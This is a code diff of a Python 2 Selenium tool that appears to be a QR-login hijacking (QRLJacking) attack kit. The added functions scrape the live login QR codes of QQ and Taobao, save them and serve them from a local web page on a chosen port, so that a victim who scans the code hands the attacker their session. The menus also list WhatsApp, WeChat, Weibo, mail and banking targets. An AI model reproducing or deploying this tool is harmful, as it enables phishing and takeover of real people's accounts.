@@ -4,6 +4,7 @@
 import base64 ,time ,selenium ,os ,urllib ,sys ,threading ,configparser
 from selenium import webdriver
 from binascii import a2b_base64
+from PIL import Image
 
 #settings = configparser.ConfigParser()
 
@@ -26,6 +27,18 @@ def create_driver():
 		web = webdriver.Chrome()
 		print " [+]Opening Google Chrome..."
 		return web
+
+#Stolen from stackoverflow :D
+def Screenshot(PicName ,location ,size):
+	img = Image.open(PicName)#screenshot.png
+	left = location['x']
+	top = location['y']
+	right = left + size['width']
+	bottom = top + size['height']
+	box = (int(left), int(top), int(right), int(bottom))
+	final = img.crop(box) # defines crop points
+	final.load()
+	final.save(PicName)
 
 def whatsapp():
 	driver = create_driver()
@@ -162,6 +175,61 @@ def WeChat():
 		except:
 			break
 
+def QQ():
+	driver = create_driver()
+	time.sleep(5)
+	print " [+]Navigating To Website.."
+	driver.get("http://w.qq.com")
+	time.sleep(10)
+	while True:
+		print "-- --- -- --- -- --- -- --- -- --- --"
+		try:
+			driver.save_screenshot('tmp.png') #screenshot entire page
+			img = driver.find_elements_by_tag_name("img")[0]
+			print " [+]The QR code image found !"
+			location = img.location
+			size = img.size
+			print " [+]Grabbing photo.."
+			Screenshot("tmp.png" ,location ,size)
+			print " [#]Saved To tmp.png"
+			webdriver.delete_all_cookies()
+			time.sleep(10)
+			print " [!]Refreshing page..."
+			driver.refresh()
+			continue
+		except Exception as e:
+			print e
+			break
+
+def Taobao():
+	driver = create_driver()
+	time.sleep(5)
+	print " [+]Navigating To Website.."
+	driver.get("https://login.taobao.com")
+	time.sleep(5)
+	while True:
+		print "-- --- -- --- -- --- -- --- -- --- --"
+		try:
+			button_class = web.find_element_by_class_name("msg-err")
+			button = button_class.find_elements_by_tag_name("a")[0]
+			print " [!]Clicking to reload QR code image..."
+			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
+			time.sleep(5)
+		except:
+			pass
+		try:
+			imgs = driver.find_elements_by_tag_name('img')
+			img = imgs[0]
+			print " [+]The QR code image found !"
+			src = img.get_attribute('src')
+			print " [+]Downloading the image.."
+			qr = urllib.urlretrieve(src, "tmp.png")
+			print " [#]Saved To tmp.png"
+			time.sleep(10)
+			continue
+		except:
+			break
+
 def make(typ="html"):
 	if typ == "html":
 		code = """<html>
@@ -222,7 +290,7 @@ def clear():
 		os.system("clear")
 
 def main():
-	clear()
+	#clear()
 	print """\n
 	  ___         _       _               _
 	 / _ \  _ __ | |     | |  __ _   ___ | | __ ___  _ __
@@ -293,6 +361,15 @@ def main():
 			Weibo()
 			main()
 
+		elif int(choice_2) == 5:
+			port = raw_input(" Port to listen on (Default 1337) : ")
+			if port == "":port = 1337
+			clear()
+			make()
+			Serve_it(port)
+			QQ()
+			main()
+
 	#Mailing Services
 	if choice == 2:
 		print """
@@ -328,6 +405,15 @@ def main():
 	"""
 		choice_2 = raw_input(" Second Choice > ")
 		if choice_2 == "00":
+			main()
+
+		elif int(choice_2) == 3:
+			port = raw_input(" Port to listen on (Default 1337) : ")
+			if port == "":port = 1337
+			clear()
+			make()
+			Serve_it(port)
+			Taobao()
 			main()
 
 	#Online Banking
